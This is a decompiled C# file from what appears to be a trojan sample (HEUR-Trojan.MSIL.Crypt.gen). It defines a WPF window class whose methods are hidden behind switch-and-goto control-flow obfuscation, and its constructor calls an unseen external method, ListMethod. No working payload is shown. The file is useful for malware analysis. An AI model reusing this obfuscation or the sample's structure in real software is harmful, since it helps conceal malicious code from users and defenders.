// Decompiled with JetBrains decompiler
// Type: Tourield.Specifications.Bridge
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Markup;

namespace Tourield.Specifications
{
  public class Bridge : Window, IComponentConnector
  {
    internal TextBlock txt1;
    private bool strategy;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Bridge()
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_2;
            case 1:
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              goto case 2;
            case 2:
              this.InitializeComponent();
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_2;
            case 5:
              goto label_7;
            default:
              goto label_6;
          }
        }
label_2:
        RegistryPagePage.ListMethod();
        num1 = 4;
        continue;
label_6:
        num1 = 2;
      }
label_7:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        bool strategy;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              strategy = this.strategy;
              num2 = 4;
              continue;
            case 1:
            case 4:
              if (!strategy)
              {
                this.strategy = true;
                if (true)
                {
                  num2 = 3;
                  continue;
                }
                goto label_4;
              }
              else
                goto label_10;
            case 3:
              goto label_4;
            case 5:
              goto label_8;
            case 6:
              goto label_9;
            default:
              goto label_7;
          }
        }
label_4:
        Uri resourceLocator = new Uri("/DebuggerTypeProxyAttrib;component/window2.xaml", UriKind.Relative);
        goto label_8;
label_7:
        num1 = 5;
        continue;
label_8:
        Application.LoadComponent((object) this, resourceLocator);
        num1 = 6;
      }
label_10:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int offsetident, object cont)
    {
      int num1 = 1;
      if (true)
        goto label_8;
label_1:
      int num2;
      int num3;
      if (num2 != 1)
      {
        num3 = 5;
      }
      else
      {
        this.txt1 = (TextBlock) cont;
        return;
      }
label_7:
      num1 = num3;
label_8:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            num2 = offsetident;
            num1 = 2;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_5;
          case 4:
            goto label_11;
          case 5:
            goto label_4;
          case 6:
            goto label_12;
          default:
            if (Bridge.DefineAttribute())
            {
              num1 = 4;
              continue;
            }
            goto label_10;
        }
      }
label_4:
      this.strategy = true;
      num3 = 6;
      goto label_7;
label_5:
      return;
label_11:
      return;
label_12:
      return;
label_10:;
    }

    internal static bool DefineAttribute() => true;

    internal static bool ComputeAttribute() => false;
  }
}
